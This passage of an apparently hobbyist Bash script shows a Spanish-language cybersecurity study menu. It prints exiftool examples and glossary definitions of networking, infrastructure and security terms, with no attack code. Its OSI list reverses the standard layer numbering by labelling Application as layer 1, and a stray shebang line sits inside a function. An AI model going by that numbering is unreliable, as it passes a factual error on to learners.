    echo -e "exiftool -Author='Hacker' doc.pdf : Cambiar autor"
    echo -e "exiftool *.jpg > datos.txt     : Extraer metadatos en lote\n"
    read -p "Presiona Enter para volver..." _
    menu_herramientas
}

menu5(){
    clear
    echo -e "\n🔒 SEGURIDAD: Conjunto de prácticas, herramientas y principios para proteger sistemas, redes y datos de accesos no autorizados o maliciosos.\n"
    echo -e "👤 Autenticación:\nProceso de verificar la identidad de un usuario o sistema.\nEjemplo: Login con usuario y contraseña.\n"
    echo -e "🛡️ Autorización:\nProceso que define qué recursos o acciones puede realizar un usuario una vez autenticado.\nEjemplo: Un usuario autenticado puede ver datos, pero no modificarlos.\n"
    echo -e "🔑 Hash:\nTransformación de datos en una cadena única e irreversible.\nEjemplo: SHA-256, MD5 (no recomendado por inseguro).\nUsado para almacenar contraseñas sin guardarlas en texto claro.\n"
    echo -e "🧂 Salting:\nTécnica para añadir texto aleatorio a las contraseñas antes de hacerles hash, evitando ataques de diccionario o rainbow tables.\n"
    echo -e "🔐 Cifrado (Encryption):\nProceso reversible para ocultar datos. Solo se pueden leer con la clave adecuada.\nEjemplo: AES, RSA.\n"
    echo -e "📦 Tokens:\nCadenas generadas automáticamente para identificar sesiones o accesos.\nEjemplo: JWT (JSON Web Token) en APIs.\n"
    echo -e "📲 MFA / 2FA:\nAutenticación con múltiples factores (contraseña + código SMS, o app como Authy/Google Authenticator).\nMejora radicalmente la seguridad.\n"
    echo -e "🚫 Zero Trust:\nModelo donde nadie (ni dentro ni fuera de la red) es confiable por defecto.\nTodo debe ser verificado constantemente.\n"
    echo -e "🧨 Escalada de privilegios:\nTécnica para obtener más permisos de los que deberías tener (ej: de usuario a root/admin).\n"
    echo -e "🔐 Seguridad en capas:\nTambién llamada 'defensa en profundidad'. Se basa en aplicar múltiples medidas de protección en cada capa del sistema (red, app, usuario, etc).\n"
    echo -e "🔍 Seguridad en la nube:\nAplicación de controles de acceso, cifrado, auditoría y configuración segura en entornos como AWS, Azure, GCP, etc.\n"
    echo -e "📁 Gestión de credenciales:\nBuenas prácticas para almacenar, proteger y rotar contraseñas, claves API y secretos.\n"
    echo -e "🧪 Pentesting:\nPruebas controladas que simulan ataques reales para encontrar vulnerabilidades antes que lo haga un atacante.\n"
    echo -e "🧑‍💼 Ingeniería social:\nAtaques basados en manipular a personas para obtener acceso o información (phishing, vishing, pretexting...).\n"
    echo -e "🧱 Segmentación de red:\nDividir una red en partes independientes para limitar el movimiento lateral de un atacante.\n"
    echo ""
    read -p 'Presiona Enter para volver al menú de conceptos...' _
}
menu4(){
    echo -e "\n🏗️ Infraestructura: Se refiere al conjunto de componentes físicos y lógicos que forman una red o sistema informático.\n"
    echo -e "🖥️ Servidor:\nUna máquina que ofrece servicios (web, archivos, bases de datos, etc.) a otros dispositivos llamados clientes.\nEjemplo: Un servidor web con Apache o Nginx que entrega páginas a navegadores.\n"
    echo -e "💻 Cliente:\nDispositivo que solicita servicios al servidor (como tu navegador cuando entras a Google).\n"
    echo -e "🧱 Firewall:\nDispositivo o software que filtra el tráfico de red, permitiendo o bloqueando conexiones según reglas.\nUsado para proteger sistemas de accesos no autorizados.\n"
    echo -e "🕵️ IDS (Intrusion Detection System):\nSistema que detecta actividad sospechosa en la red y la reporta, pero no actúa directamente.\nEjemplo: Snort.\n"
    echo -e "🛡️ IPS (Intrusion Prevention System):\nComo el IDS pero además de detectar, puede bloquear ataques automáticamente.\n"
    echo -e "🌐 Proxy:\nServidor intermediario entre el cliente y el servidor final.\nUsado para ocultar IP, filtrar contenido o mejorar rendimiento.\nEjemplo: Squid proxy.\n"
    echo -e "🕳️ VPN (Virtual Private Network):\nCrea un túnel cifrado entre tu dispositivo y un servidor para proteger tu tráfico y ocultar tu ubicación.\nEjemplo: OpenVPN, WireGuard.\n"
    echo -e "🧅 TOR (The Onion Router):\nRed anónima que enruta el tráfico a través de múltiples nodos cifrados para ocultar el origen.\nUsado para privacidad extrema y acceso a la dark web.\n"
    echo -e "🧠 DNS Forwarding:\nCuando un servidor DNS no sabe una respuesta, la reenvía a otro DNS (usado en empresas).\n"
    echo -e "🕳️ DNS Spoofing:\nAtaque donde se responde falsamente a una consulta DNS para redirigir al usuario a un sitio malicioso.\n"
    echo -e "📡 Red interna vs externa:\n- Red interna: la red privada de una empresa u hogar (no accesible desde fuera).\n- Red externa: la red pública como Internet.\n"
    echo -e "☁️ Cloud (nube):\nUso de servidores remotos (como AWS, Azure o Google Cloud) para alojar servicios, aplicaciones o datos.\n"
    echo -e "📊 DMZ (zona desmilitarizada):\nParte de una red donde se colocan los servidores públicos (web, correo) para aislarlos de la red interna segura.\n"
    read -p 'Presiona Enter para volver al menú de conceptos...' _
}
menu3(){
    echo -e "\n📡 IP (Internet Protocol):\nUna dirección única que identifica un dispositivo en una red.\nEjemplo IPv4: 192.168.1.10\nEjemplo IPv6: 2001:0db8:85a3::8a2e:0370:7334\n"
    echo -e "🔀 Subred / Máscara de red:\nDivide una red grande en varias pequeñas.\nEjemplo: 255.255.255.0 o /24 (permite 254 hosts).\n"
    echo -e "🌐 Gateway:\nPuerta de enlace entre tu red local e Internet.\nGeneralmente es el router: 192.168.1.1\n"
    echo -e "📦 TCP (Transmission Control Protocol):\nProtocolo orientado a la conexión. Garantiza que los datos lleguen completos y en orden.\nUsado por HTTP, HTTPS, SSH, FTP.\n"
    echo -e "🚀 UDP (User Datagram Protocol):\nProtocolo sin conexión. Más rápido pero menos fiable.\nUsado por DNS, streaming, juegos online.\n"
    echo -e "📶 ICMP (Internet Control Message Protocol):\nUsado para diagnóstico de red, como ping o traceroute.\n"
    echo -e "🧱 Modelo OSI (7 capas):\n1. Aplicación\n2. Presentación\n3. Sesión\n4. Transporte\n5. Red\n6. Enlace de datos\n7. Física\n"
    echo -e "🧱 Modelo TCP/IP (4 capas):\n1. Aplicación\n2. Transporte\n3. Internet\n4. Acceso a red\n"
    echo -e "🔄 ARP (Address Resolution Protocol):\nConvierte direcciones IP en direcciones MAC dentro de la red local.\nAtaque común: ARP Spoofing.\n"
    echo -e "🌍 DNS (Domain Name System):\nTraduce nombres de dominio a direcciones IP.\nEjemplo: google.com → 142.250.68.78\n"
    echo -e "📥 DHCP (Dynamic Host Configuration Protocol):\nAsigna automáticamente direcciones IP a los dispositivos.\n"
    echo -e "🔁 NAT (Network Address Translation):\nTraduce direcciones IP privadas a públicas para salir a Internet.\n"
    echo -e "🔁 PAT (Port Address Translation):\nSimilar a NAT pero usando puertos diferentes para múltiples dispositivos.\n"
    echo -e "🚪 Puertos:\nSon puntos de entrada/salida para servicios de red.\nEjemplos:\n- HTTP: 80\n- HTTPS: 443\n- SSH: 22\n"
    echo -e "🔌 Sockets:\nCombinación de IP + puerto (ejemplo: 192.168.1.10:22).\nPermite múltiples conexiones en un solo dispositivo.\n"
    echo -e "🔐 HTTP vs HTTPS:\n- HTTP (puerto 80): No cifrado.\n- HTTPS (puerto 443): Cifrado con TLS/SSL. Protege contra sniffing y MITM.\n"
    read -p "Presiona Enter para volver al menú de conceptos..." _
}

menu2() {
    clear
    echo "===== CONCEPTOS ====="
    echo "1) Redes y Protocolos"
    echo "2) Infraestructura"
    echo "3) Seguridad"
    echo "4) Volver al menú principal"
    echo "======================="
    echo -n "Elige una opción: "
    read opcion2

    case $opcion2 in
        1)
            echo "Mostrando Redes y Protocolos..."
            sleep 2
            menu3
            ;;
        2)
            echo "Mostrando Infraestructura..."
            sleep 2
            menu4
            ;;
        3)
            echo "Mostrando Seguridad..."
            sleep 2
            menu5
            ;;
        4)
            mostrar_menu
            return
            ;;
        *)
            echo "Opción inválida"
            sleep 2
            ;;
    esac

    menu2  # Vuelve al submenú después de ejecutar algo
}

# Menú principal
mostrar_menu() {
    clear
    #!/bin/bash

# Colores
RED="\\e[31m"
GREEN="\\e[32m"
BLUE="\\e[34m"
CYAN="\\e[36m"
RESET="\\e[0m"

# Cabecera visual
clear
echo -e "${CYAN}"
echo "██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗    ██╗██╗  ██╗██╗██╗"
echo "██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║    ██║██║ ██╔╝██║██║"
echo "██████╔╝███████║███████║██║     █████╔╝ ██║ █╗ ██║█████╔╝ ██║██║"
echo "██╔═══╝ ██╔══██║██╔══██║██║     ██╔═██╗ ██║███╗██║██╔═██╗ ██║╚═╝"
echo "██║     ██║  ██║██║  ██║╚██████╗██║  ██╗╚███╔███╔╝██║  ██╗██║██╗"
echo "╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝╚═╝"
echo -e "${BLUE}                     ⛧ Created by: ${RED}XShadowByte${RESET}"
echo
sleep 2

    echo "1) Conceptos"
    echo "2) Herramientas"
    echo "3) Ataques"
    echo "4) Salir"
    echo "========================"
    echo -n "Elige una opción: "
    read opcion

    case $opcion in
        1)
            menu2
            ;;
        2)
            echo "Mostrando herramientas..."
            sleep 2
            menu_herramientas
            ;;
        3)
            echo "Mostrando ataques..."
            sleep 2
            menu_ataques
            ;;
        4)
            echo "¡Hasta luego!"
            exit 0
            ;;
        *)
            echo "Opción inválida"
            sleep 2
            mostrar_menu
            ;;
    esac
}

# Iniciar el script
mostrar_menu
